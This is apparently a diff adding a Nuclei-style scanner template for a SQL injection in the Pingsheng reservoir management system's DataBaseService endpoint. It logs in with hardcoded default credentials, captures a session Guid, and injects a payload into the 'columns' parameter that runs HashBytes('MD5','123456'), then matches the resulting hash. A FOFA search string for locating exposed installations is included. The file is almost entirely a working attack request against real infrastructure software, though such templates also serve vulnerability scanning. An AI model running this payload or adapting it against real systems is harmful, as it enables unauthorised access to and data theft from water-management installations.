@@ -1,0 +1,52 @@
+id: pingsheng-skxt-databaseservice-sqli
+
+info:
+  name: pingsheng-skxt-databaseservice-sqli
+  author: unknow
+  severity: critical
+  description: 平升 水库系统 databaseservice 存在SQL注入漏洞。
+  tags: pingsheng,sqli
+  metadata:
+    fofa-qeury: body="js/PSExtend.js"
+
+http:
+  - raw:
+    - |
+      POST /Webservices/UserAdminService.asmx/Login HTTP/1.1
+      Host: 
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+      Accept: application/json, text/plain, */*
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 35
+      Connection: close
+
+      LoginName=Data86&LoginPwd=Data86%40
+    - |
+      POST /WebServices/DataBaseService.asmx/GetRecordsByTableNameAndColumns HTTP/1.1
+      Host: 
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+      Content-Length: 105
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Content-Type: application/x-www-form-urlencoded
+      Connection: close
+
+      loginIdentifer={{Guid}}&requestInfos=&tableName=syscolumns&columns=top+1+substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)    
+
+    extractors:
+      - type: regex
+        name: Guid
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - "Guid\":\"(.*)\"}</string>"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2==200 && contains(body_2, "e10adc3949ba59abbe56e057f20f883e") && contains(header_2, "text/xml")'
